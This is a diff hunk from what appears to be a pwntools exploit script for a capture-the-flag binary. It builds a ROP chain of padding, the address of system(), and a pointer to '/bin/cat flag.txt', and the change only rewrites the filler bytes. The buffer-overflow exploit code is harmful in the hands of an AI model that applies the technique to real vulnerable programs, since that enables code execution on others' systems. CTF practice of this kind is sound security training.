@@ -11,7 +11,7 @@ p = process(BINARY)
 
 rop = b"A" * 44
 rop += p32(ELF.symbols["system"])
-rop += b"B" * 4
+rop += b"BBBB"
 rop += p32(0x0804A030) # address of "/bin/cat flag.txt"
 
 log.success(f"ROP chain : {rop}")
